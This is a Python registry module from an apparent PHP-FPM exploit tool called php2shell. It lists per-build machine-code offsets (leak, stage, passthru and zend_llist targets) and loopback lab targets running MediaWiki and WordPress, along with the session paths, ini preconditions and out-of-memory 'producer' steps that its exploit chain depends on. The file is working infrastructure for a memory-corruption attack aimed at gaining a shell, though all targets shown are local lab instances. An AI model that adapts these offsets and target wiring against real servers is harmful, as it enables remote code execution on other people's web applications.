"""Target and binary-profile registry.

BINARY_PROFILES holds the per-build machine-code offsets consumed by the
``--step chain`` exchange sequence. Both entries were measured against the
operator's own lab builds (moved verbatim from the pre-restructure
php2shell/php2shell.py driver; comments kept).

TARGETS registers the loopback lab targets used by the driver --target flag:

  binary_profile     key into BINARY_PROFILES; per-build constants for the
                     leak/chain math (see tool/php2shell.py)
  host / port / path loopback endpoints (source: universal/freeze_battery.py
                     TARGETS dict, measured on the operator stack)
  session_save_path  where the fpm worker writes sess_* records
                     (source: universal/freeze_battery.py)
  ini                knobs expected on the target stack; taken from the run
                     receipts (memory_limit=8M arm receipts diag3,
                     8M post_max_size budget measured in the freeze battery).
                     VERIFY per target before a chain run; these are
                     preconditions, not driver-controlled settings.
  producer_modules   producer shape builders applicable to the target
                     (tool/modules/producer_618.py / producer_619.py)
  producer_step      --step produce / --with-producer wiring
                     (tool/stages/produce.py): the target-bound default
                     producer kind plus the per-kind verification status,
                     mined from the run receipts. Journal:
                     - wiki `"edit"`: VERIFIED — receipted app-level OOM
                       fatal on this target (MediaWiki 1.46.2, anon edit
                       POST): prod ladder 3M/6M -> the 150-byte
                       "Allowed memory size ... Fatal error" receipt,
                       <=2M no fatal, 9M = post_max_size pre-parser ceiling
                       (NOT a producer);
                       /tmp/opencode/realapps/side/php2shell/runs/
                       run_fpmwiki_20261021_173406/prod/.
                     - wiki/wp `"618"`: receipted over HTTP FPM through the
                       staged sender (200 OK + sess record, workers alive,
                       inert forge);
                       docs/reports_realapps_validation_1021.md.
                     - `"619"`: CGI lab-jig receipts only; the HTTP FPM
                       paced transport is wired but UNVERIFIED.
                     - wp `"edit"`: TODO — no app-level anon-edit OOM
                       producer verified for WordPress 7.1.3 (the FPM
                       exploitable sequence hard-requires an app-level
                       fatal after a successful request startup; another
                       application needs its own receipted producer).

Not implemented (chain stage targets): the modphp target carries no measured
addresses yet and no producer is wired for it; TARGETS["modphp"] is a stub on
purpose. See also tool/modules/producer.py (mod_php producer TODO).
"""

BINARY_PROFILES = {
    "ubuntu85-1.3-compact": {
        "name": "ubuntu85-1.3-compact",
        "leak_offset": 0x57030,
        "target_offset": 0x6BB80,
        "stage_offset": 0x850D8,
        "dso_deltas": (0x1800000, 0x1A00000),
        "zif_passthru_offset": 0x3DDAA0,
        "zend_llist_remove_tail_offset": 0x5C9470,
        "blockers": 149,
    },
    # measured live on the operator-owned PIE fpm (2026-10-21):
    # workers are forks of one master (shared layout); php_base constant
    # 0x55ffad000000, stable main chunk 0x7f8875a00000 -> delta below.
    "realapps-pie": {
        "name": "realapps-pie",
        "leak_offset": 0x57030,
        "target_offset": 0x6BB80,
        "stage_offset": 0x850D8,
        "dso_deltas": (0x296DA4A00000,),
        "zif_passthru_offset": 0x6496C2,
        "zend_llist_remove_tail_offset": 0x84C1AB,
        "blockers": 149,
    },
}

TARGETS = {
    # sources: universal/freeze_battery.py TARGETS (host/port/path/sessions dir),
    # universal/fullflow_wiki + fullflow_wp run captures, docs/validation_1021_filmpost.md
    "wiki": {
        "name": "wiki",
        "binary_profile": "realapps-pie",
        "host": "127.0.0.1",
        "port": 28840,
        "path": "/index.php",
        "session_save_path": "/tmp/opencode/realapps/sessions/wiki",
        "ini": {
            # as-found on the running [wiki] pool (UNIVERSAL_PLAN.md, section a):
            # fpm_realapps.conf [wiki]; no upload_progress overrides anywhere in
            # the stack, so compiled 8.5.10 defaults apply (session.c:934-945).
            "memory_limit": "8M (php_admin_value, fpm pool conf)",
            "pm": "static",
            "pm.max_children": "1 (duplicate key: later value wins)",
            "pm.max_requests": "5000",
            "session.upload_progress.enabled": "1 (compiled default, session.c:934)",
            "session.upload_progress.cleanup": "1 (compiled default at runtime; "
                "the ASAN diag receipts override it to 0 - lab-only)",
        },
        "workers": "php-fpm pool [wiki], pm=static, single worker",
        "producer_modules": ("producer_618", "producer_619"),
        "producer_step": {
            # --step produce / --with-producer (tool/stages/produce.py)
            "default": "edit",
            "kinds": {
                "edit": "verified on this target: anon-edit OOM fatal, "
                    "prod ladder receipts 3M/6M -> 150-B fatal; <=2M no fatal; "
                    "9M = post_max_size ceiling (not a producer)",
                "618": "receipted over HTTP FPM via the staged sender: 200 OK, "
                    "sess record, workers alive (inert forge)",
                "619": "TODO (CGI lab-jig receipts only; HTTP FPM paced "
                    "transport wired but UNVERIFIED)",
            },
        },
        "status": "available (probe + chain + produce)",
    },
    "wp": {
        "name": "wp",
        "binary_profile": "realapps-pie",
        "host": "127.0.0.1",
        "port": 28841,
        "path": "/index.php",
        "session_save_path": "/tmp/opencode/realapps/sessions/wp",
        "ini": {
            # same compiled-defaults reasoning as [wiki]; verify pool conf per run
            "memory_limit": "8M (php_admin_value, fpm pool conf)",
            "pm": "static",
            "pm.max_children": "1 (verify per run)",
            "pm.max_requests": "5000",
            "session.upload_progress.enabled": "1 (compiled default, session.c:934)",
            "session.upload_progress.cleanup": "1 (compiled default at runtime)",
        },
        "workers": "php-fpm pool, pm=static",
        "producer_modules": ("producer_618", "producer_619"),
        "producer_step": {
            # --step produce / --with-producer (tool/stages/produce.py)
            "default": None,  # no default: --producer required explicitly
            "kinds": {
                "edit": "TODO (WordPress 7.1.3: no receipted anon-edit "
                    "app-level OOM producer)",
                "618": "receipted over HTTP FPM via the staged sender: 200 OK, "
                    "sess record, workers alive (inert forge)",
                "619": "TODO (CGI lab-jig receipts only; HTTP FPM paced "
                    "transport wired but UNVERIFIED)",
            },
        },
        "status": "available (probe + chain + produce)",
    },
    "modphp": {
        "name": "modphp",
        "binary_profile": None,
        "host": None,
        "port": None,
        "path": None,
        "session_save_path": None,
        "ini": {},
        "workers": None,
        "producer_modules": (),
        "producer_step": {
            "default": None,
            "kinds": {},
        },
        # TODO (missing module): no measured per-build constants and no
        # producer wired for a mod_php SAPI target. Fill in after the
        # per-binary profile run creates the needed addresses/ entry
        # (see universal/profile_builder.py and addresses/generated/).
        "status": "TODO (missing module: no producer, no addresses)",
    },
}


def is_known_target(value: str) -> bool:
    return value in TARGETS


def profile_for(target_name: str | None, url_target: bool) -> str:
    """Binary profile name for a registered target, or raise ValueError."""
    if url_target or target_name not in TARGETS:
        raise ValueError(
            "no binary profile bound to this target; pass --profile explicitly"
        )
    name = TARGETS[target_name].get("binary_profile")
    if name is None:
        raise ValueError(
            f"target {target_name} has no binary profile yet: {TARGETS[target_name]['status']}"
        )
    return name


def url_for(target_name: str) -> str | None:
    entry = TARGETS.get(target_name)
    if not entry or entry.get("host") is None:
        return None
    return f"http://{entry['host']}:{entry['port']}{entry['path']}"
